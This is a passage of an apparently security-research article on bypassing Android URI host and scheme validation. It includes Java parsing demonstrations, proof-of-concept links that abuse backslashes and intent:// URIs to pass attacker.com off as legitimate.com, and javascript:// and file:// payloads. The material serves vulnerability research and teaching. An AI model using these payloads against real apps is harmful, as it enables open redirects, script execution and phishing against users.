class=\"kd\"\u003epublic\u003c/span\u003e \u003cspan class=\"kd\"\u003eclass\u003c/span\u003e \u003cspan class=\"nc\"\u003eTestActivity\u003c/span\u003e \u003cspan class=\"kd\"\u003eextends\u003c/span\u003e \u003cspan class=\"nc\"\u003eActivity\u003c/span\u003e \u003cspan class=\"o\"\u003e{\u003c/span\u003e\n\n    \u003cspan class=\"kd\"\u003eprotected\u003c/span\u003e \u003cspan class=\"kt\"\u003evoid\u003c/span\u003e \u003cspan class=\"nf\"\u003eonCreate\u003c/span\u003e\u003cspan class=\"o\"\u003e(\u003c/span\u003e\u003cspan class=\"nc\"\u003eBundle\u003c/span\u003e \u003cspan class=\"n\"\u003esavedInstanceState\u003c/span\u003e\u003cspan class=\"o\"\u003e)\u003c/span\u003e \u003cspan class=\"o\"\u003e{\u003c/span\u003e\n        \u003cspan class=\"kd\"\u003esuper\u003c/span\u003e\u003cspan class=\"o\"\u003e.\u003c/span\u003e\u003cspan class=\"na\"\u003eonCreate\u003c/span\u003e\u003cspan class=\"o\"\u003e(\u003c/span\u003e\u003cspan class=\"n\"\u003esavedInstanceState\u003c/span\u003e\u003cspan class=\"o\"\u003e);\u003c/span\u003e\n\n        \u003cspan class=\"nc\"\u003eUri\u003c/span\u003e \u003cspan class=\"n\"\u003euri\u003c/span\u003e \u003cspan class=\"o\"\u003e=\u003c/span\u003e \u003cspan class=\"n\"\u003egetIntent\u003c/span\u003e\u003cspan class=\"o\"\u003e().\u003c/span\u003e\u003cspan class=\"na\"\u003egetData\u003c/span\u003e\u003cspan class=\"o\"\u003e();\u003c/span\u003e\n        \u003cspan class=\"nc\"\u003eLog\u003c/span\u003e\u003cspan class=\"o\"\u003e.\u003c/span\u003e\u003cspan class=\"na\"\u003ed\u003c/span\u003e\u003cspan class=\"o\"\u003e(\u003c/span\u003e\u003cspan class=\"s\"\u003e\u0026quot;Wow\u0026quot;\u003c/span\u003e\u003cspan class=\"o\"\u003e,\u003c/span\u003e \u003cspan class=\"s\"\u003e\u0026quot;Scheme: \u0026quot;\u003c/span\u003e \u003cspan class=\"o\"\u003e+\u003c/span\u003e \u003cspan class=\"n\"\u003euri\u003c/span\u003e\u003cspan class=\"o\"\u003e.\u003c/span\u003e\u003cspan class=\"na\"\u003egetScheme\u003c/span\u003e\u003cspan class=\"o\"\u003e());\u003c/span\u003e\n        \u003cspan class=\"nc\"\u003eLog\u003c/span\u003e\u003cspan class=\"o\"\u003e.\u003c/span\u003e\u003cspan class=\"na\"\u003ed\u003c/span\u003e\u003cspan class=\"o\"\u003e(\u003c/span\u003e\u003cspan class=\"s\"\u003e\u0026quot;Wow\u0026quot;\u003c/span\u003e\u003cspan class=\"o\"\u003e,\u003c/span\u003e \u003cspan class=\"s\"\u003e\u0026quot;UserInfo: \u0026quot;\u003c/span\u003e \u003cspan class=\"o\"\u003e+\u003c/span\u003e \u003cspan class=\"n\"\u003euri\u003c/span\u003e\u003cspan class=\"o\"\u003e.\u003c/span\u003e\u003cspan class=\"na\"\u003egetUserInfo\u003c/span\u003e\u003cspan class=\"o\"\u003e());\u003c/span\u003e\n        \u003cspan class=\"nc\"\u003eLog\u003c/span\u003e\u003cspan class=\"o\"\u003e.\u003c/span\u003e\u003cspan class=\"na\"\u003ed\u003c/span\u003e\u003cspan class=\"o\"\u003e(\u003c/span\u003e\u003cspan class=\"s\"\u003e\u0026quot;Wow\u0026quot;\u003c/span\u003e\u003cspan class=\"o\"\u003e,\u003c/span\u003e \u003cspan class=\"s\"\u003e\u0026quot;Host: \u0026quot;\u003c/span\u003e \u003cspan class=\"o\"\u003e+\u003c/span\u003e \u003cspan class=\"n\"\u003euri\u003c/span\u003e\u003cspan class=\"o\"\u003e.\u003c/span\u003e\u003cspan class=\"na\"\u003egetHost\u003c/span\u003e\u003cspan class=\"o\"\u003e());\u003c/span\u003e\n        \u003cspan class=\"nc\"\u003eLog\u003c/span\u003e\u003cspan class=\"o\"\u003e.\u003c/span\u003e\u003cspan class=\"na\"\u003ed\u003c/span\u003e\u003cspan class=\"o\"\u003e(\u003c/span\u003e\u003cspan class=\"s\"\u003e\u0026quot;Wow\u0026quot;\u003c/span\u003e\u003cspan class=\"o\"\u003e,\u003c/span\u003e \u003cspan class=\"s\"\u003e\u0026quot;toString(): \u0026quot;\u003c/span\u003e \u003cspan class=\"o\"\u003e+\u003c/span\u003e \u003cspan class=\"n\"\u003euri\u003c/span\u003e\u003cspan class=\"o\"\u003e.\u003c/span\u003e\u003cspan class=\"na\"\u003etoString\u003c/span\u003e\u003cspan class=\"o\"\u003e());\u003c/span\u003e\n    \u003cspan class=\"o\"\u003e}\u003c/span\u003e\n\u003cspan class=\"o\"\u003e}\u003c/span\u003e\n\u003c/code\u003e\u003c/pre\u003e\u003c/div\u003e\n\u003cp\u003eIn my case it displays:\u003c/p\u003e\n\u003cdiv class=\"highlight\"\u003e\u003cpre class=\"highlight plaintext\"\u003e\u003ccode\u003e10-30 06:02:20.142 32044 32044 D Wow     : Scheme: https\n10-30 06:02:20.142 32044 32044 D Wow     : UserInfo: null\n10-30 06:02:20.142 32044 32044 D Wow     : Host: legitimate.com\n10-30 06:02:20.142 32044 32044 D Wow     : toString(): https://legitimate.com@attacker.com\n\u003c/code\u003e\u003c/pre\u003e\u003c/div\u003e\n\u003cp\u003eIt happens because apps parse URI only once, and a victim app doesn\u0026#39;t parse it again, but trusts to \u0026quot;already parsed\u0026quot; URI received from untrusted sources\u003c/p\u003e\n\n\u003ch1 id=\"3-remote-technique-for-1\"\u003e#3 Remote technique for #1\u003c/h1\u003e\n\n\u003cp\u003eAs you know, apps can automatically handle external links from browsers/messengers. This can be done by registering a special \u003ccode\u003eintent-filter\u003c/code\u003e\u003c/p\u003e\n\u003cdiv class=\"highlight\"\u003e\u003cpre class=\"highlight xml\"\u003e\u003ccode\u003e    \u003cspan class=\"nt\"\u003e\u0026lt;activity\u003c/span\u003e \u003cspan class=\"na\"\u003eandroid:name=\u003c/span\u003e\u003cspan class=\"s\"\u003e\u0026quot;.DeeplinkActivity\u0026quot;\u003c/span\u003e\u003cspan class=\"nt\"\u003e\u0026gt;\u003c/span\u003e\n        \u003cspan class=\"nt\"\u003e\u0026lt;intent-filter\u003c/span\u003e \u003cspan class=\"na\"\u003eandroid:autoVerify=\u003c/span\u003e\u003cspan class=\"s\"\u003e\u0026quot;true\u0026quot;\u003c/span\u003e\u003cspan class=\"nt\"\u003e\u0026gt;\u003c/span\u003e\n            \u003cspan class=\"nt\"\u003e\u0026lt;action\u003c/span\u003e \u003cspan class=\"na\"\u003eandroid:name=\u003c/span\u003e\u003cspan class=\"s\"\u003e\u0026quot;android.intent.action.VIEW\u0026quot;\u003c/span\u003e\u003cspan class=\"nt\"\u003e/\u0026gt;\u003c/span\u003e\n            \u003cspan class=\"nt\"\u003e\u0026lt;category\u003c/span\u003e \u003cspan class=\"na\"\u003eandroid:name=\u003c/span\u003e\u003cspan class=\"s\"\u003e\u0026quot;android.intent.category.DEFAULT\u0026quot;\u003c/span\u003e\u003cspan class=\"nt\"\u003e/\u0026gt;\u003c/span\u003e\n            \u003cspan class=\"nt\"\u003e\u0026lt;category\u003c/span\u003e \u003cspan class=\"na\"\u003eandroid:name=\u003c/span\u003e\u003cspan class=\"s\"\u003e\u0026quot;android.intent.category.BROWSABLE\u0026quot;\u003c/span\u003e\u003cspan class=\"nt\"\u003e/\u0026gt;\u003c/span\u003e\n            \u003cspan class=\"nt\"\u003e\u0026lt;data\u003c/span\u003e \u003cspan class=\"na\"\u003eandroid:scheme=\u003c/span\u003e\u003cspan class=\"s\"\u003e\u0026quot;https\u0026quot;\u003c/span\u003e \u003cspan class=\"na\"\u003eandroid:host=\u003c/span\u003e\u003cspan class=\"s\"\u003e\u0026quot;legitimate.com\u0026quot;\u003c/span\u003e\u003cspan class=\"nt\"\u003e/\u0026gt;\u003c/span\u003e\n        \u003cspan class=\"nt\"\u003e\u0026lt;/intent-filter\u0026gt;\u003c/span\u003e\n    \u003cspan class=\"nt\"\u003e\u0026lt;/activity\u0026gt;\u003c/span\u003e\n\u003c/code\u003e\u003c/pre\u003e\u003c/div\u003e\n\u003cp\u003eAt this step you\u0026#39;ve already verified that you can attack that from third-party apps/ADB. If you try to create a remote PoC both to match the filter (remember that Android also uses \u003ccode\u003eparsedIntent.getData().getHost()\u003c/code\u003e to match with values defined in intent-filters) and triggers the bug\u003c/p\u003e\n\u003cdiv class=\"highlight\"\u003e\u003cpre class=\"highlight html\"\u003e\u003ccode\u003e\u003cspan class=\"nt\"\u003e\u0026lt;a\u003c/span\u003e \u003cspan class=\"na\"\u003ehref=\u003c/span\u003e\u003cspan class=\"s\"\u003e\u0026quot;https://attacker.com\\\\@legitimate.com/\u0026quot;\u003c/span\u003e\u003cspan class=\"nt\"\u003e\u0026gt;\u003c/span\u003eBegin zaheck!\u003cspan class=\"nt\"\u003e\u0026lt;/a\u0026gt;\u003c/span\u003e\n\u003c/code\u003e\u003c/pre\u003e\u003c/div\u003e\n\u003cp\u003eor\u003c/p\u003e\n\u003cdiv class=\"highlight\"\u003e\u003cpre class=\"highlight html\"\u003e\u003ccode\u003e\u003cspan class=\"nt\"\u003e\u0026lt;a\u003c/span\u003e \u003cspan class=\"na\"\u003ehref=\u003c/span\u003e\u003cspan class=\"s\"\u003e\u0026quot;https://attacker.com%5C%5C@legitimate.com/\u0026quot;\u003c/span\u003e\u003cspan class=\"nt\"\u003e\u0026gt;\u003c/span\u003eBegin zaheck!\u003cspan class=\"nt\"\u003e\u0026lt;/a\u0026gt;\u003c/span\u003e\n\u003c/code\u003e\u003c/pre\u003e\u003c/div\u003e\n\u003cp\u003eyou will notice that in the first example all \u003ccode\u003e\\\u003c/code\u003e will be replaced with \u003ccode\u003e/\u003c/code\u003e, in the second they will be kept encoded and the backslash trick won\u0026#39;t work. But after careful research how \u003ccode\u003eintent://\u003c/code\u003e scheme uries work I found a way to exploit it remotely. Intro: \u003ca title=\"https://www.mbsd.jp/Whitepaper/IntentScheme.pdf\" href=\"/redirect?url=https%3A%2F%2Fwww.mbsd.jp%2FWhitepaper%2FIntentScheme.pdf\" target=\"_blank\" rel=\"nofollow noopener noreferrer\"\u003e\u003cspan\u003ehttps://www.mbsd.jp/Whitepaper/IntentScheme.pdf\u003c/span\u003e\u003ci class=\"icon-external-link\"\u003e\u003c/i\u003e\u003c/a\u003e\u003c/p\u003e\n\n\u003cp\u003eAll backslashes could be saved in unchanged state in e.g. hash part of a URI right here \u003ca title=\"https://android.googlesource.com/platform/frameworks/base/+/568faa8ed90d965faf302ca60677a40a5b84bf86/core/java/android/content/Intent.java#6334\" href=\"/redirect?url=https%3A%2F%2Fandroid.googlesource.com%2Fplatform%2Fframeworks%2Fbase%2F%2B%2F568faa8ed90d965faf302ca60677a40a5b84bf86%2Fcore%2Fjava%2Fandroid%2Fcontent%2FIntent.java%236334\" target=\"_blank\" rel=\"nofollow noopener noreferrer\"\u003e\u003cspan\u003ehttps://android.googlesource.com/platform/frameworks/base/+/568faa8ed90d965faf302ca60677a40a5b84bf86/core/java/android/content/Intent.java#6334\u003c/span\u003e\u003ci class=\"icon-external-link\"\u003e\u003c/i\u003e\u003c/a\u003e\u003c/p\u003e\n\n\u003cp\u003ePoC:\u003c/p\u003e\n\u003cdiv class=\"highlight\"\u003e\u003cpre class=\"highlight html\"\u003e\u003ccode\u003e\u003cspan class=\"nt\"\u003e\u0026lt;a\u003c/span\u003e \u003cspan class=\"na\"\u003ehref=\u003c/span\u003e\u003cspan class=\"s\"\u003e\u0026quot;intent://not_used/#Intent;scheme=https://attacker.com\\\\@legitimate.com/;end\u0026quot;\u003c/span\u003e\u003cspan class=\"nt\"\u003e\u0026gt;\u003c/span\u003eBegin zaheck!\u003cspan class=\"nt\"\u003e\u0026lt;/a\u0026gt;\u003c/span\u003e\n\u003c/code\u003e\u003c/pre\u003e\u003c/div\u003e\n\u003cp\u003eHere \u003ca title=\"https://android.googlesource.com/platform/frameworks/base/+/568faa8ed90d965faf302ca60677a40a5b84bf86/core/java/android/content/Intent.java#6436\" href=\"/redirect?url=https%3A%2F%2Fandroid.googlesource.com%2Fplatform%2Fframeworks%2Fbase%2F%2B%2F568faa8ed90d965faf302ca60677a40a5b84bf86%2Fcore%2Fjava%2Fandroid%2Fcontent%2FIntent.java%236436\" target=\"_blank\" rel=\"nofollow noopener noreferrer\"\u003e\u003cspan\u003ehttps://android.googlesource.com/platform/frameworks/base/+/568faa8ed90d965faf302ca60677a40a5b84bf86/core/java/android/content/Intent.java#6436\u003c/span\u003e\u003ci class=\"icon-external-link\"\u003e\u003c/i\u003e\u003c/a\u003e it will be equal to\u003c/p\u003e\n\u003cdiv class=\"highlight\"\u003e\u003cpre class=\"highlight java\"\u003e\u003ccode\u003e\u003cspan class=\"nc\"\u003eUri\u003c/span\u003e\u003cspan class=\"o\"\u003e.\u003c/span\u003e\u003cspan class=\"na\"\u003eparse\u003c/span\u003e\u003cspan class=\"o\"\u003e(\u003c/span\u003e\u003cspan class=\"s\"\u003e\u0026quot;https://attacker.com\\\\\\\\@legitimate.com/://not_used/\u0026quot;\u003c/span\u003e\u003cspan class=\"o\"\u003e)\u003c/span\u003e\n\u003c/code\u003e\u003c/pre\u003e\u003c/div\u003e\n\u003cp\u003eAnd the attack becomes remote!\u003c/p\u003e\n\n\u003ch1 id=\"4-missing-scheme-validation\"\u003e#4 Missing scheme validation\u003c/h1\u003e\n\n\u003cp\u003eIn case if only the host value is validated, but the scheme isn\u0026#39;t validated, you can use the following payloads with \u003ccode\u003ejavascript://\u003c/code\u003e and \u003ccode\u003efile://\u003c/code\u003e scheme\u003c/p\u003e\n\u003cdiv class=\"highlight\"\u003e\u003cpre class=\"highlight plaintext\"\u003e\u003ccode\u003ejavascript://legitimate.com/%0aalert(1)//\n\u003c/code\u003e\u003c/pre\u003e\u003c/div\u003e\n\u003cp\u003eor\u003c/p\u003e\n\u003cdiv class=\"highlight\"\u003e\u003cpre class=\"highlight plaintext\"\u003e\u003ccode\u003efile://legitimate.com/sdcard/payload.html\n\u003c/code\u003e\u003c/pre\u003e\u003c/div\u003e"}]}